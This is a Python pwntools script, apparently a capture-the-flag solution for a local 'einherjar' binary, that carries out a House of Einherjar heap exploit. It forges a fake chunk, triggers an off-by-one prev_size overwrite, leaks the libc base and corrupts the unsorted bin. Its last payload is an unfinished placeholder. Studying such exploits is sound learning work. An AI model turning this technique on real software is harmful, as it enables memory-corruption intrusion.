#!/usr/bin/env python
# coding=utf-8
# Author : huzai24601
from pwn import *
from LibcSearcher import *
#context.terminal = ['terminal', '-x', 'sh', '-c']
context(arch='amd64',os='linux',log_level='debug')
elf = ELF('./einherjar')
p=process(elf.path)
local_libc_64  = ELF('/lib/x86_64-linux-gnu/libc.so.6')
s=lambda data :p.send(data)
sa=lambda delim,data :p.sendafter(delim, data)
sl=lambda data :p.sendline(data)
sla=lambda delim,data :p.sendlineafter(delim, data) 
r=lambda numb=4096 :p.recv(numb)
ru=lambda delims :p.recvuntil(delims)
uu64=lambda data :u64(data.ljust(8,'\x00'))
leak=lambda name,addr :log.success('{} ===> {:#x}'.format(name, addr))
def debug():
    gdb.attach(p)
    pause()

#leak fake chunk address
ru('0x')
fake_addr = int(r(7),16)
leak("fake_addr",fake_addr)

#create fake chunk,avoid unlink check
#ATTENTION: the fd and bk's address is fake chunk's addr
payload = p64(0) + p64(0x221) + p64(fake_addr)*2
sa('s0\n',payload)

#triger off by one
#ATTENTION: tht presize is the offset between fake chunk and the chunk we will free
payload = 'a'*0x10 + p64(0x220) + '\x00'
sa('s1\n',payload)

#leak libc
main_area = uu64(ru('\x7f')[-6:]) - 88
libc_base = main_area  - 0x3c4b20
leak("libc_base",libc_base)

#modify the unstored bin's head
payload = p64(0) + p64(0x71) + p64(main_area+88)*2
s(payload)

# now we can change s0 by edit d0
payload = 'write s0 by edit d0'
s(payload)
debug()
p.interactive()
